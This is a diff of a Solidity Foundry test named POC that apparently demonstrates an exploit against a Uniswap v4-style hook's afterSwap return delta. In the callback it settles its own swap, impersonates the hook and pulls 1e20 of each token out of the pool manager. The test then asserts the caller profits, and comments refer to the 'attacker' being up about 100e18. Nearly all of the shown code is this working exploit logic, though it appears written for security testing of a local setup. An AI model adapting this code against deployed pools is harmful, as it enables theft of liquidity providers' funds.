@@ -47,28 +47,23 @@ contract POC is Test {
             if(delta.amount0()>0) manager.take(c0, address(this), uint128(delta.amount0()));
             if(delta.amount1()>0) manager.take(c1, address(this), uint128(delta.amount1()));
         } else {
-            // EXACT handling - this is what fixes CurrencyNotSettled
             BalanceDelta s = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
-            int128 a0 = s.amount0();
-            int128 a1 = s.amount1();
-            // c0
-            if(a0<0){manager.sync(c0); token0.mint(address(manager), uint128(-a0)); manager.settle();}
-            else if(a0>0){manager.take(c0, address(this), uint128(a0));}
-            // c1
-            if(a1<0){manager.sync(c1); token1.mint(address(manager), uint128(-a1)); manager.settle();}
-            else if(a1>0){manager.take(c1, address(this), uint128(a1));}
-            // Hook's 1e20 is already taken to you inside afterSwap (setAttacker), 
-            // but if your version doesn't, uncomment this - take EXACT 1e20, not 1000e18:
+            // 1. Handle YOUR swap delta (exact)
+            if(s.amount0()<0){manager.sync(c0); token0.mint(address(manager), uint128(-s.amount0())); manager.settle();}
+            if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
+            if(s.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-s.amount1())); manager.settle();}
+            if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
+            // 2. Handle HOOK's 1e20 - MUST prank as hook
+            vm.startPrank(address(hook));
             try manager.take(c0, address(this), 1e20) {} catch {}
             try manager.take(c1, address(this), 1e20) {} catch {}
+            vm.stopPrank();
         }
         return "";
     }
     function test_afterSwapReturnDelta() public {
         uint b0 = token0.balanceOf(address(this));
-        uint b1 = token1.balanceOf(address(this));
         manager.unlock(abi.encode(uint256(2)));
-        // You should be up ~100e18
-        assertTrue(token0.balanceOf(address(this)) > b0 || token1.balanceOf(address(this)) > b1);
+        assertGt(token0.balanceOf(address(this)), b0);
     }
 }
